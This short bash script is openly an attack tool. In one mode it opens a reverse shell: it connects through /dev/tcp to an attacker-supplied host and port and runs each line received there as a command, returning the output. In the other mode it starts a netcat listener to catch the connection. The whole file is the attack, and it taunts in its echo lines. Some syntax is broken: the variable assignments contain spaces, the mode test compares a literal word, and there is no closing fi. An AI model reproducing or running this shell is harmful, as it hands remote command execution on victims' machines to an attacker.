mode = $1
attacker = $2
target = $3
port = $4

if [ mode = -s ] 
	then 
	echo "            UwU                  "
	echo " calling back to $attacker:$port "
	exec 5<>/dev/tcp/$attacker/$port
	cat <&5 | while read line; do $line 2>&5 >&5; done 
	
	
elif [ mode = -h ]
	then
	echo "Shhhh... now listening on localhost:$port  >:D"
	nc -l -p $port -vvv
	
	
